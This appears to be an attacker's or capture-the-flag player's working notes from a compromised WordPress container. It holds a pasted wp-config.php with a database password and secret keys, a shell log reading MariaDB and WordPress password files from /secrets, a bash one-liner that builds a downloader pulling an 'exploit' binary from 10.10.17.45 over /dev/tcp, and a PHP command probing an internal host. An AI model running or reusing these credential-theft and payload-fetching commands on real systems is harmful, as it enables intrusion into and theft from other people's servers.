












































<!-- Wp config


* You don't have to use the website, you can copy this file to "wp-config.php"                                                                                                                                      08:52:25 [70/121]
 * and fill in the values.                                                                                                                                                                                                            
 *                                                                                                                                                                                                                                    
 * This file contains the following configurations:                                                                                                                                                                                   
 *                                                                                                                                                                                                                                    
 * * Database settings                                                                                                                                                                                                                
 * * Secret keys                                                                                                                                                                                                                      
 * * Database table prefix                                                                                                                                                                                                            
 * * ABSPATH                                                                                                                                                                                                                          
 *                                                                                                                                                                                                                                    
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/                                                                                                                                                 
 *                                                                                                                                                                                                                                    
 * @package WordPress                                                                                                                                                                                                                 
 */                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                      
// ** Database settings - You can get this info from your web host ** //                                                                                                                                                              
/** The name of the database for WordPress */                                                                                                                                                                                         
define( 'DB_NAME', 'bitnami_wordpress' );                                                                                                                                                                                             
                                                                                                                                                                                                                                      
/** Database username */                                                                                                                                                                                                              
define( 'DB_USER', 'bn_wordpress' );                                                                                                                                                                                                  
                                                                                                                                                                                                                                      
/** Database password */                                                                                                                                                                                                              
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );                                                                                                                                                                                  
                                                                                                                                                                                                                                      
/** Database hostname */                                                                                                                                                                                                              
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );                                                                                                                                                                                     
                                                                                                                                                                                                                                      
/** Database charset to use in creating database tables. */                                                                                                                                                                           
define( 'DB_CHARSET', 'utf8' );                                                                                                                                                                                                       
                                                                                                                                                                                                                                      
/** The database collate type. Don't change this if in doubt. */                                                                                                                                                                      
define( 'DB_COLLATE', '' );                                                                                                                                                                                                           
                                                                                                                                                                                                                                      
/**#@+                                                                                                                                                                                                                                
 * Authentication unique keys and salts.                                                                                                                                                                                              
 *                                                                                                                                                                                                                                    
 * Change these to different unique phrases! You can generate these using                                                                                                                                                             
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.                                                                                                                                       
 *                                                                                                                                                                                                                                    
 * You can change these at any point in time to invalidate all existing cookies.                                                                                                                                                      
 * This will force all users to have to log in again.                                                                                                                                                                                 
 *                                                                                                                                                                                                                                    
 * @since 2.6.0                                                                                                                                                                                                                       
 */
define( 'AUTH_KEY',         'G7T{pv:!LZWUfekgP{A8TGFoL0,dMEU,&2B)ALoZS[8lo8V~+UGj@kWW%n^.vZgx' );
define( 'SECURE_AUTH_KEY',  'F3!hvuWAWvZw^$^|L]ONjyS{*xPHr(j,2$)!@t.(ZEn9NPNQ!A*6o6l}8@IN)>?>' );
define( 'LOGGED_IN_KEY',    'E5x5$T@Ggpti3+!/0G<>j<ylElF+}#Ny-7XZLw<#j[6|:oel9%OgxG|U}86./&&K' );
define( 'NONCE_KEY',        'jM^E^Bx{vf-Ca~2$eXbH%RzD?=VmxWP9Z}-}J1E@N]t`GOP`8;<F;lYmGz8sh7sG' );
define( 'AUTH_SALT',        '+L>`[0~bk-bRDX 5F?ER)PUnB_ ZWSId=J {5XV:trSTp0u!~6shvPS`VP{f(@_Q' );
define( 'SECURE_AUTH_SALT', 'RdhA5mNy%0~H%~s~S]a,G~;=n|)+~hZ/JWy*$GP%sAB-f>.;rcsO6.HXPvw@2q,]' );
define( 'LOGGED_IN_SALT',   'i?aJHLYu/rI%@MWZTw%Ch~%h|M/^Wum4$#4;qm(#zgQA+X3gKU?~B)@Mbgy %k}G' );
define( 'NONCE_SALT',       'Y!dylf@|OTpnNI+fC~yFTq@<}$rN)^>=+e}Q~*ez?1dnb8kF8@_{QFy^n;)gk&#q' );


Pass MariaDB

<ess-698f59878d-62l76:/secrets$ cat mariadb-password              
sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-698f59878d-62l76:/secrets$ cat mariadb-password
<ess-698f59878d-62l76:/secrets$ cat mariadb-password              
sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-698f59878d-62l76:/secrets$ cat mariadb-root-password
<98f59878d-62l76:/secrets$ cat mariadb-root-password              
sW5sp4syetre32828383kE4oSI have no name!@beta-vino-wp-wordpress-698f59878d-62l76:/secrets$ cat wordpress-password
<s-698f59878d-62l76:/secrets$ cat wordpress-password              
O8F7KR5zGiI have no name!@beta-vino-wp-wordpress-698f59878d-62l76:/secrets$ 


echo '#!/bin/bash
exec 3<>/dev/tcp/10.10.17.45/8000
echo -e "GET /exploit HTTP/1.0\r\nHost: 10.10.17.45\r\n\r\n" >&3
cat <&3 | tail -n +$(($(grep -anm1 "^$" <&3 | cut -d: -f1) + 1)) > /tmp/exploit
chmod +x /tmp/exploit' > /tmp/downloader.sh && chmod +x /tmp/downloader.sh


php -r "echo file_get_contents('http://10.43.2.241:5000/');"


